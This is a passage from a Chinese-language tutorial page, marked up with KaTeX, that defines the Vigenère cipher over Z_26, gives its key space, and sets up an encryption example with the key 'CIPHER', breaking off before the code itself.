<h3 id="密码体制-4"><a class="markdownIt-Anchor" href="#密码体制-4"></a> 密码体制</h3>
<ul>
<li>设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">m\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>是一个正整数。定义<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mi>C</mi><mo>=</mo><mi>K</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>Z</mi><mn>26</mn></msub><msup><mo stretchy="false">)</mo><mi>m</mi></msup></mrow><annotation encoding="application/x-tex">P=C=K=(Z_{26})^m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span></span></span></span>。对任意的密钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>k</mi><mi>m</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K=(k_1,k_2,\cdots ,k_m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，定义<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>x</mi><mi>m</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>x</mi><mi>m</mi></msub><mo>+</mo><msub><mi>k</mi><mi>m</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e_k(x_1,x_2,\cdots ,x_m)=(x_1+k_1,x_2+k_2,\cdots ,x_m+k_m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>y</mi><mi>m</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mn>1</mn></msub><mo>−</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo>−</mo><msub><mi>k</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>y</mi><mi>m</mi></msub><mo>−</mo><msub><mi>k</mi><mi>m</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d_k(y_1,y_2,\cdots ,y_m)=(y_1-k_1,y_2-k_2,\cdots ,y_m-k_m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。且以上所有运算都是在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上进行。</li>
<li>维吉尼亚密码空间大小为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn><msup><mn>6</mn><mi>m</mi></msup></mrow><annotation encoding="application/x-tex">26^m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span></span></span></span>，所以即使<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>的值很小，穷尽密钥搜索算法也需要很长的时间。</li>
</ul>
<h3 id="代码实现-4"><a class="markdownIt-Anchor" href="#代码实现-4"></a> 代码实现</h3>
<ul>
<li>
<p>假设这里<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">m=6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span></span></span></span>，密钥字为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mi>I</mi><mi>P</mi><mi>H</mi><mi>E</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CIPHER</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span></span></span></span>，其对应的数字串<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo><mo stretchy="false">(</mo><mn>2</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>15</mn><mo separator="true">,</mo><mn>7</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>17</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K=(2,8,15,7,4,17)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mclose">)</span></span></span></span>。要加密的明文为：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>e</mi><mi>l</mi><mi>c</mi><mi>o</mi><mi>m</mi><mi>e</mi><mi>T</mi><mi>o</mi><mi>H</mi><mi>u</mi><mi>a</mi><mi>z</mi><mi>h</mi><mi>o</mi><mi>n</mi><mi>g</mi><mi>U</mi><mi>n</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>i</mi><mi>t</mi><mi>y</mi><mi>O</mi><mi>f</mi><mi>S</mi><mi>c</mi><mi>i</mi><mi>e</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi>A</mi><mi>n</mi><mi>d</mi><mi>T</mi><mi>e</mi><mi>c</mi><mi>h</mi><mi>n</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">WelcomeToHuazhongUniversityOfScienceAndTechnology</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">u</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault">n</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mord mathdefault">A</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mord mathdefault">n</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。首先将明文串转化为对应的数字串，再与对应的密钥数字进行相加后模26运算，再将对应的数字串转化为字符串即可。</p>
</li>
<li>
<p>加密代码实现：</p>
